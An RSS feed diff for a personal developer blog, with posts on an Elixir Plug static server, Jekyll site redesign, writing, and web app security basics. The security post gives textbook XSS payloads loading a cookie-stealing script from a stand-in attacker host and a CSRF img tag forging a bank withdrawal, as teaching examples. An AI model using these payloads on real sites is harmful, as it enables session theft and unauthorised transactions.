@@ -1,0 +1,379 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Eric Ren</title>
+    <description>This is the blog of Eric Ren</description>
+    <link>http://ericren.me/</link>
+    <atom:link href="http://ericren.me/feed.xml" rel="self" type="application/rss+xml" />
+    
+      <item>
+        <title>Simple Static Server With Elixir And Plug</title>
+        <description>&lt;p&gt;Similar to Rack in Ruby, &lt;a href=&quot;https://github.com/elixir-lang/plug&quot;&gt;Plug&lt;/a&gt; seems to be the de-facto generic adapter for web servers in Elixir.
+Here’s are simple steps to get a simple static server running.&lt;/p&gt;
+
+&lt;p&gt;First let’s create a mix project:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;mix new server
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;server&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can use some default Plug modules to help us with serving files, namely Plug.Router and Plug.Static.&lt;/p&gt;
+
+&lt;p&gt;First lets add in the dependencies in &lt;code class=&quot;highlighter-rouge&quot;&gt;mix.exs&lt;/code&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-elixir&quot; data-lang=&quot;elixir&quot;&gt;&lt;span class=&quot;k&quot;&gt;defp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deps&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:cowboy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;~&amp;gt; 1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:plug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;~&amp;gt; 1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Next, in &lt;code class=&quot;highlighter-rouge&quot;&gt;lib/server.ex&lt;/code&gt;, fill in the module like so:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-elixir&quot; data-lang=&quot;elixir&quot;&gt;&lt;span class=&quot;k&quot;&gt;defmodule&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+  &lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Plug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Router&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;plug&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Plug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;at:&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from:&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:server&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;plug&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:match&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;plug&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:dispatch&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_resp_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;text/html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;priv/static/index.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send_resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sd&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;not found&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Plug.Static&lt;/code&gt; allows us to serve static files from some specified path on our server.  Since we are passing in our app name as an atom, &lt;code class=&quot;highlighter-rouge&quot;&gt;:server&lt;/code&gt;, by default the root URL will be mapped to &lt;code class=&quot;highlighter-rouge&quot;&gt;priv/static/&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;:match&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;:dispatch&lt;/code&gt; plugs allow us to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;get&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;match&lt;/code&gt; functions.  We use them here to route the root URL to serve an index file.&lt;br /&gt;
+If the request path is not the root, then the &lt;code class=&quot;highlighter-rouge&quot;&gt;match&lt;/code&gt; function will match all other requests to a 404 response.&lt;/p&gt;
+
+&lt;p&gt;Run the Plug app within iex:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;iex -S mix
+&lt;span class=&quot;gp&quot;&gt;iex&amp;gt; &lt;/span&gt;c &lt;span class=&quot;s2&quot;&gt;&quot;lib/server.ex&quot;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;iex&amp;gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;:ok, _&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Plug.Adapters.Cowboy.http Server, &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Go to &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost:4000&lt;/code&gt; and voila, we have a simple, static server running with Plug!&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 13 Jan 2016 00:00:00 -0800</pubDate>
+        <link>http://ericren.me/blog/notes/2016/01/13/simple-static-server-with-elixir-and-plug/</link>
+        <guid isPermaLink="true">http://ericren.me/blog/notes/2016/01/13/simple-static-server-with-elixir-and-plug/</guid>
+      </item>
+    
+      <item>
+        <title>Web App Security Notes</title>
+        <description>&lt;p&gt;Here are some of my brief notes on the topic of web app security basics.  Most of the info is paraphrased from the wikipedia links in the References section.&lt;/p&gt;
+
+&lt;p&gt;##Same-origin policy and CORS
+&lt;a href=&quot;https://en.wikipedia.org/wiki/Same-origin_policy&quot;&gt;Same-origin policy&lt;/a&gt; states that a web browser permits scripts on one web page to access data on another web page, but only if they have the same ‘origin’.  Origin is a combination of the URI scheme(protocol), hostname, and port number.&lt;/p&gt;
+
+&lt;p&gt;In some cases, this policy is too restrictive (e.g. Sites that need to access assets from subdomains). There are a few ways to relax this policy.  One of them is &lt;a href=&quot;https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&quot;&gt;Cross-Origin Resource Sharing (CORS)&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;CORS adds some headers to create a simple protocol for allowing cross-origin requests. 
+Browser first sends a request with an &lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt; HTTP header like so:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.mysite.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The server than responds with an &lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin (ACAO)&lt;/code&gt; header, which indicates which origin sites are allowed:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: http://www.othersite.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;ACAO can also look like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: *
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;However this is dangerous since it allows any site to access the resources on the server. The wildcard is only appropiate when the server’s response can be completely public (e.g Google Fonts).&lt;/p&gt;
+
+&lt;p&gt;NOTE: SOP does not apply to the ‘src’ attribute of images, style, iframe, script elements, forms, etc.&lt;/p&gt;
+
+&lt;p&gt;##Cross Site Scripting
+Cross Site Scripting (XSS) vulnerabilities enable attackers to inject client-side scripts into web pages viewed by other users.
+It is one of the most common security vulnerabilites out there on the web.&lt;/p&gt;
+
+&lt;p&gt;###Reflected (non-persistent)
+Non-persistent XSS vulnerability is the most common type.  These are caused by data provided by a client (from HTTP query params, HTML forms, etc.) is immediately loaded and parsed by server-side scripts, without sanitizing the data.&lt;/p&gt;
+
+&lt;p&gt;A classic example of this type of vulnerability is injecting a script in the search bar.  Usually the URL for a search page has the search term as a query parameter, e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;www.example.com/?q=cats&lt;/code&gt;.  When the search results load, the page will show something along the lines of: “Search results for ‘cats’”.  If the site does not properly sanitize the query param input, then an attacker can add a payload like so:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.example.com/?q=cats&amp;lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The attacker then sends this URL to the victim.  When the victim clicks on the link, “Search results for ‘cats’” will be dipslayed, and in the background the script is processed.&lt;/p&gt;
+
+&lt;p&gt;###Persistent
+In a persistent XSS attack, the attacker stores the payload on the server, and the malicious data is permanently displayed for all users to see (and potentially be a victim of). Example: Mallory creates an account on Bob’s website, and finds a stored XSS vulnerability.  She learns that the comments section of a News story will display anything she posts.  And so she posts text like so:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This is an awesome story!&amp;lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;When another user, say Alice, visits the page with Mallory’s comments, the script tag will run and Alice’s authorization cookie will be stolen.&lt;/p&gt;
+
+&lt;p&gt;##Cross Site Request Forgery
+&lt;a href=&quot;https://en.wikipedia.org/wiki/Cross-site_request_forgery&quot;&gt;Cross Site Request Forgery (CSRF)&lt;/a&gt; is a type of &lt;a href=&quot;https://en.wikipedia.org/wiki/Confused_deputy_problem&quot;&gt;confused deputy problem&lt;/a&gt;.  The attack exploits the website’s trust in the user’s identity by giving unauthorized user commands to the website.  In essence, the ‘confused deputy’ is the Web Browser, since it is confused into misusing Alice’s authority due to Mallory.&lt;/p&gt;
+
+&lt;p&gt;Example from wikipedia: 
+Alice is browsing a chat forum when another user Mallory posted a message.  The message contains an &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag with a &lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt; referencing an action on Alice’s bank website.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;http://somebank.com/withdraw?account=Alice&amp;amp;amount=10000000&amp;amp;for=Mallory&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;If Alice’s cookie contains the bank’s authorization info, then when the browser loads the image, the transaction is authorized without Alice’s approval.&lt;/p&gt;
+
+&lt;p&gt;The fundamental difference between XSS and CSRF is that XSS exploits user’s trust in website, whereas CSRF exploits the trust the website has in the victim’s Web browser.&lt;/p&gt;
+
+&lt;p&gt;#References
+https://en.wikipedia.org/wiki/Cross-site_request_forgery
+https://en.wikipedia.org/wiki/Same-origin_policy
+https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&lt;/p&gt;
+
+&lt;p&gt;http://schock.net/articles/2013/07/03/hosting-web-fonts-on-a-cdn-youre-going-to-need-some-cors/&lt;/p&gt;
+</description>
+        <pubDate>Sun, 09 Aug 2015 00:00:00 -0700</pubDate>
+        <link>http://ericren.me/blog/notes/2015/08/09/web-app-security-notes/</link>
+        <guid isPermaLink="true">http://ericren.me/blog/notes/2015/08/09/web-app-security-notes/</guid>
+      </item>
+    
+      <item>
+        <title>A New Beginning</title>
+        <description>&lt;p&gt;Back in 2012, I started to learn about web development and decided to make my
+own personal website.  My only criteria for the website was that it could handle
+blog posts and other simple pages such as project links.  I wanted to use a more
+‘hackerish’ framework, so I went with &lt;a href=&quot;http://octopress.org/&quot;&gt;Octopress&lt;/a&gt; at the time.
+Octopress uses &lt;a href=&quot;http://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt;, but takes care of configuration,
+HTML/CSS templates, js, etc. for you.  And it comes with a nice default theme
+&lt;sup id=&quot;fnref:5&quot;&gt;&lt;a href=&quot;#fn:5&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;However after spending some time with it, I found that there was too much bloat.
+I recently decided to switch over to Jekyll and start building out the look of my 
+site from scratch.&lt;/p&gt;
+
+&lt;p&gt;#Design
+To come up with a new design, I went on a browsing binge and googled different
+styles.  Here are just a few sites I drew inspiration from:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://m3xm.github.io/hikari-for-Jekyll/&quot;&gt;hikari theme&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://mmistakes.github.io/hpstr-jekyll-theme/about/&quot;&gt;hpster theme&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://camporez.com/&quot;&gt;camporez&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://dbtek.github.io/dbyll/&quot;&gt;dbyll&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/&quot;&gt;medium.com&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://mademistakes.com/&quot;&gt;mademistakes.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;#Jekyll&lt;/p&gt;
+
+&lt;p&gt;##Portfolio
+One of the main reasons I have a personal website is to show off my past and
+future projects.  When coming up with the site structure, I thought about adding
+a portfolio section with project posts &lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;.  However I decided it was a lot
+simpler to stick with a simple list of links to my projects instead.  I figured
+if I wanted to, I could always manually add a link to a project post in &lt;code class=&quot;highlighter-rouge&quot;&gt;_data/projects.yml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;##Liquid Tags
+http://docs.shopify.com/themes/liquid-documentation (liquid tags)
+Maybe I’ve been spoiled by good docs from places like Apple’s iOS documentation 
+and the Ruby on Rails, but the documentation for liquid tags leaves a lot to be desired.  I
+found that it didn’t have enough examples and was not clear enough for some simple
+tasks.&lt;/p&gt;
+
+&lt;p&gt;Here is a small list of gotchas I personally encountered:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Watch out for ‘if’ tag in ‘capture’ tag. Found out that the ‘capture’ tag will capture empty strings if the ‘if’ statement is not true.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;And also, why doesn’t liquid tags have a ‘!’ (not)  operator?&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Condition statment in this if tag does not support parens?&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;...)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;...)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;something&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;endif&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;#CSS&lt;/p&gt;
+
+&lt;p&gt;##Gotchas&lt;/p&gt;
+
+&lt;p&gt;I wanted to close the side nav menu when the user resizes the site from small
+to big.  So I figured I could write some small javascript code to accomplish
+this.  However this approach isn’t the best because:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;It fires a lot of unnecessary events if the user often resizes browser.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Since I’m ‘closing’ the menu when I resize the window to a larger width, I
+also need to add more logic to ‘open’ the menu again when I resize the window
+back to a smaller width.  And that begs the question, shouldn’t the state of a nav menu remain the same whether or not the window is large or small? If the user has a menu open, he/she should expect the menu to stay open when the window resizes.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;It makes logical sense, albeit changes my site design.  Now the site will have
+potentially two sections to access the page links.  I think a great way to solve
+this problem is to forego changing the state of the nav menu, and just create a
+side menu for the list of page links &lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;So essentially I have two menus to access page links: One on the left side that can be opened and closed, and a regular one on top that only appears when the browser window is big enough.  This avoids the messy logic of keeping a nav menu open or not when resizing the window.&lt;/p&gt;
+
+&lt;p&gt;Although this solution leads to a bit of code duplication, it gives the user
+more ways to navigate.  If we wanted to, we can extract out the logic of listing
+out pages.&lt;/p&gt;
+
+&lt;p&gt;#Javascript&lt;/p&gt;
+
+&lt;p&gt;##Transitions
+For the top header, I found a great blog post detailing how to make a header hide
+when the user scrolls down &lt;sup id=&quot;fnref:3&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;.  I made some small modifications to make the
+hiding behavior suit my needs.&lt;/p&gt;
+
+&lt;p&gt;While styling the website,  I found a visual bug where the sidebar would show
+pop in and out when resizing the page.  Turns out it was because the ‘left’ css
+attribute for the side bar was changing due to media queries, and the default
+css for the sidebar had a transition attribute defined that applies anytime the
+‘left’ attribute changed.&lt;/p&gt;
+
+&lt;p&gt;I needed to somehow turn off css animations for the element when the sidebar is not open.  Nothing that a little JS can’t fix.  I eventually figured out I needed to add the transition attribute right after the user clicked the open button, and then remove the attirbute once the transition ended.  And what do you know, browsers have transitionEnd events for us to
+listen to &lt;sup id=&quot;fnref:4&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;##Media Queries
+I wanted to dynamically adjust the comments height for certain window widths,
+so I learned about the Media Query API &lt;sup id=&quot;fnref:6&quot;&gt;&lt;a href=&quot;#fn:6&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;.  I was familiar with media queries in 
+CSS, but never worked with them in javascript code.  After reading a 
+(brief introduction to media queries in javascript)[mq-js], I got the concept
+fairly quickly.  The biggest benefit I see in using them is that it provides
+a consistent, cross-browser solution to handling different window widths.&lt;/p&gt;
+
+&lt;p&gt;##Misc. 
+I got a big refresher on everything about js while working on this website.
+Concepts such as caveats of &lt;code class=&quot;highlighter-rouge&quot;&gt;this&lt;/code&gt;, obscure details about Event Handling, 
+DOM manipulation, and all those frustating, seemingly random, idiosyncratic javascript behaviors.
+It’s good to be back in web development.&lt;/p&gt;
+
+&lt;p&gt;#Summary
+Overall, I am glad I decided to redesign my personal website.   I still have 
+to work on other aspects of the design, such as typography, but for now it’s 
+good enough to put up live.  There were a lot of frustrating moments during
+development, but I learned a lot during the process.  I put in a lot more hours
+than I thought I would have, but it was worth the pain and frustration to 
+refresh myself on front end development.  Let’s hope I keep at this in the future.&lt;/p&gt;
+
+&lt;p&gt;#Reference&lt;/p&gt;
+
+&lt;p&gt;Before I decided to start over with developing my site, I wanted to learn the best
+practices to making web sites.  Below are some of the many resources and pages I
+looked into.&lt;/p&gt;
+
+&lt;p&gt;##CSS best practices:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://smacss.com/&quot;&gt;SMACSS Guide&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://webuild.envato.com/blog/how-to-scale-and-maintain-legacy-css-with-sass-and-smacss/&quot;&gt;How to scale and maintain legacy css with sass and smaccs&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://joshbroton.com/my-sass-less-css-practices-modularization-nesting-variables-mixins-etc/&quot;&gt;SASS and CSS Practices - Nesting variables, mixins, etc.&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://sriharisriraman.in/blog/2013/09/08/dont-nest-css/&quot;&gt;Don’t nest CSS&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://thesassway.com/beginner/how-to-structure-a-sass-project&quot;&gt;How to structure a Sass Project&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;##Misc tools
+- &lt;a href=&quot;http://dan.doezema.com/2014/01/setting-up-livereload-with-jekyll/&quot;&gt;Setting up Livereload with Jekyll&lt;/a&gt;
+- &lt;a href=&quot;https://fortawesome.github.io/Font-Awesome/&quot;&gt;Font Awesome&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;##Footnotes&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&quot;footnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:5&quot;&gt;
+      &lt;p&gt;It was so nice in fact that the majority of Octopress blogs on the web all looked the same. &lt;a href=&quot;#fnref:5&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:1&quot;&gt;
+      &lt;p&gt;http://www.divshot.com/blog/web-development/advanced-jekyll-features/#custom-post-types &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot;&gt;
+      &lt;p&gt;http://tympanus.net/codrops/2013/04/17/slide-and-push-menus/ &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot;&gt;
+      &lt;p&gt;https://medium.com/@mariusc23/hide-header-on-scroll-down-show-on-scroll-up-67bbaae9a78c &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot;&gt;
+      &lt;p&gt;http://blog.teamtreehouse.com/using-jquery-to-detect-when-css3-animations-and-transitions-end &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:6&quot;&gt;
+      &lt;p&gt;https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Media_queries &lt;a href=&quot;#fnref:6&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Mon, 06 Oct 2014 00:00:00 -0700</pubDate>
+        <link>http://ericren.me/blog/2014/10/06/move-to-jekyll/</link>
+        <guid isPermaLink="true">http://ericren.me/blog/2014/10/06/move-to-jekyll/</guid>
+      </item>
+    
+      <item>
+        <title>Writing</title>
+        <description>&lt;p&gt;I recently read a wonderful blog post by &lt;a href=&quot;http://jsomers.net/blog/more-people-should-write&quot;&gt;James Somers&lt;/a&gt; explaining why people should write more. The gist of the argument is that writing will make you see the world differently.&lt;!--more--&gt; He argues that by having a piece of writing in mind, one will attract more thoughts because your perception has changed.&lt;/p&gt;
+
